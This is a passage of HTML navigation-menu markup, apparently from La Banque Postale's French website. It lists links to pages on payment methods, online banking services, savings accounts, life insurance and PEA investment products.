                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/cartes-caritatives.html" class="a-text--small js-tracking-item">Cartes caritatives</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Moyens de paiement</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Moyens de paiement</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/virement-sepa.html" class="a-text--small js-tracking-item">Virement Sepa</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/virement-international.html" class="a-text--small js-tracking-item">Virement international</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/virement-sepa-instantane.html" class="a-text--small js-tracking-item">Virement SEPA instantané</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/prelevement.html" class="a-text--small js-tracking-item">Le Prélèvement SEPA</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/cheques.html" class="a-text--small js-tracking-item">Le Chèque</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/paylib-entre-amis.html" class="a-text--small js-tracking-item">Paylib entre amis</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/moyens-de-paiement/service-western-union.html" class="a-text--small js-tracking-item">Service Western Union</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Services digitaux</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Services digitaux</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/banque-en-ligne.html" class="a-text--small js-tracking-item">Espace Client Internet</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/application-mobile.html" class="a-text--small js-tracking-item">Application mobile</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/application-mes-paiements.html" class="a-text--small js-tracking-item">Portefeuille Mes Paiements</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/cartes-prepayees.html" class="a-text--small js-tracking-item">Espaces clients Cartes Prépayées</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/securite.html" class="a-text--small js-tracking-item">Sécurité</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/e-releve.html" class="a-text--small js-tracking-item">E-relevé</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/messagerie-securisee.html" class="a-text--small js-tracking-item">Messagerie Sécurisée</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/espaces-clients/la-banque-postale-chez-soi.html" class="a-text--small js-tracking-item">La Banque Postale Chez Soi</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>
                                                    <a href="/particulier/comptes-et-cartes/ouvrir-un-compte.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Ouvrir un compte bancaire </a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Ouvrir un compte bancaire </p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2" last-item="">
                                                    <span class="submenu-h-line animation-line"></span>
                                                    <a href="/particulier/comptes-et-cartes/ma-french-bank.html" class="a-navigation__submenu__item__label a-text--small js-tracking-item">Ma French Bank</a>

                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Ma French Bank</p>
                                                            </div>
                                                        </div>

                                                    </div>
                                                </li>

                                            </ul>
                                        </div>

                                    </div>
                                </div>
                            </li>

                            <li class="a-navigation__list__item a-navigation__menu__item u-margin-none-xs u-margin-none-sm u-spacing-s-sm" menu-index="0" data-level="1">

                                <button role="button" class="a-navigation__menu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Epargner</button>
                                <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                <span class="line--wrapper--vertical"></span>
                                <div class="m-header__submenu m-header__panel--mobile">
                                    <div class="m-header__submenu__wrapper">
                                        <div class="m-header__submenu__title m-header__panel__title u-margin-2xl-left u-margin-none-xs u-margin-none-sm u-spacing-lg-bottom">
                                            <div>
                                                <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" data-level="2">
                                <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                    <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                </svg>
                                <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu principal</span>
                            </button>
                                                <p class="a-text--small lato-bold u-text-color--black">Epargner</p>
                                            </div>
                                            <p class="a-text--small hidden-sm hidden-xs">La Banque Postale vous propose des solutions d'épargne adaptées à vos besoins et vos inspirations. Découvrez tous nos produits et services. </p>
                                        </div>
                                        <div class="m-header__submenu__list__wrapper w100--sm  u-spacing-2xl-left u-spacing-none-sm u-spacing-none-xs">
                                            <span class="submenu-v-line animation-line"></span>
                                            <ul class="m-header__submenu__list u-margin-2xl-right u-margin-none-sm u-margin-none-xs" id="submenu-0">

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Livrets d'épargne</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Livrets d'épargne</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/livret-a.html" class="a-text--small js-tracking-item">Livret A</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/ldds.html" class="a-text--small js-tracking-item">Livret de développement durable et solidaire (LDDS)</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/lep.html" class="a-text--small js-tracking-item">Livret d'épargne populaire</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/livret-jeune.html" class="a-text--small js-tracking-item">Livret jeune Swing</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/compte-sur-livret.html" class="a-text--small js-tracking-item">Compte sur livret</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/simulateur-de-livret.html" class="a-text--small js-tracking-item">Simulateur livrets d'épargne</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/livret-epargne/tous-les-livrets.html" class="a-text--small js-tracking-item">Tous les livrets</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Epargne logement</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Epargne logement</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/epargne-logement/plan-epargne-logement.html" class="a-text--small js-tracking-item">Plan épargne logement</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/epargne-logement/compte-epargne-logement.html" class="a-text--small js-tracking-item">Compte épargne logement</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Compte à terme</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Compte à terme</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/compte-a-terme/toniciel-croissance.html" class="a-text--small js-tracking-item">Toniciel Croissance</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/compte-a-terme/toniciel-sequence.html" class="a-text--small js-tracking-item">Toniciel Séquence</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Assurance vie</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Assurance vie</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/assurance-vie-et-solution-retraite/vivaccio.html" class="a-text--small js-tracking-item">Vivaccio</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/assurance-vie-et-solution-retraite/cachemire-2.html" class="a-text--small js-tracking-item">Cachemire 2</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/assurance-vie-et-solution-retraite/cachemire-pat.html" class="a-text--small js-tracking-item">Cachemire Patrimoine</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/assurance-vie-et-solution-retraite/perspective-capi.html" class="a-text--small js-tracking-item">Perspective Capi</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/assurance-vie-et-solution-retraite/cachemire-per.html" class="a-text--small js-tracking-item">Cachemire PER</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/assurance-vie-et-solution-retraite/pacte-generation.html" class="a-text--small js-tracking-item">Pacte Génération</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Placements financiers</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Placements financiers</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/diversification-cle-en-main.html" class="a-text--small js-tracking-item">La diversification clé en main</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/investissement-avec-protection-du-capital.html" class="a-text--small js-tracking-item">Investissement avec protection du capital </a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/placement-immobilier.html" class="a-text--small js-tracking-item">Les placements dans l'immobilier</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/investissement-socialement-responsable-isr.html" class="a-text--small js-tracking-item">Investissement responsable et solidaire</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/opc-autonomie.html" class="a-text--small js-tracking-item">Les OPC en toute autonomie</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/solutions-investissement-diminution-impot.html" class="a-text--small js-tracking-item">Solutions pour investir tout en diminuant ses impôts</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/cto.html" class="a-text--small js-tracking-item">Compte-Titres ordinaire</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/placements-financiers/en-savoir-plus.html" class="a-text--small js-tracking-item">En savoir plus</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Univers PEA et PEA PME-ETI</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Epargner</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Univers PEA et PEA PME-ETI</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/newsletter-reperes.html" class="a-text--small js-tracking-item">Newsletter Repères</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/selection-de-fonds-gestion-pea.html" class="a-text--small js-tracking-item">Sélection pour gérer votre PEA</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/offre-cle-en-main-pour-debuter-en-bourse.html" class="a-text--small js-tracking-item">Offre clé en main pour débuter en bourse</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/services-associes-au-pea.html" class="a-text--small js-tracking-item">Services associés au PEA</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/gestion-sous-mandat-pea.html" class="a-text--small js-tracking-item">Gestion sous mandat en PEA</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/investissement-dans-le-tissus-economique-des-pme-eti.html" class="a-text--small js-tracking-item">Investissement dans le tissu économique des PME-ETI</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/epargner/pea-et-pea-pme-eti/bourse-en-ligne.html" class="a-text--small js-tracking-item">Bourse en ligne</a>
                                                                </span>
                                                            </li>

